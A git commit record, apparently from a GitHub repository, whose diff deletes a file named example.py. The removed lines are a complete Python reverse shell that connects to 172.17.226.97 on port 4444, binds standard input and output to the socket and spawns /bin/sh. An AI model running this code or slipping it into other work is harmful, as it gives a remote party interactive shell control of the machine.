12886984796688dd5f3bdf729858560377e864b0
hbbk-ms <142399241+hbbk-ms@users.noreply.github.com>
2023-08-29 16:18:18 +0200

    Delete example.py

--- example.py
+++
@@ -1,9 +0,0 @@
-import socket,os,pty
-
-s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-
-s.connect(("172.17.226.97",4444))
-os.dup2(s.fileno(),0)
-os.dup2(s.fileno(),1)
-os.dup2(s.fileno(),2)
-pty.spawn("/bin/sh")
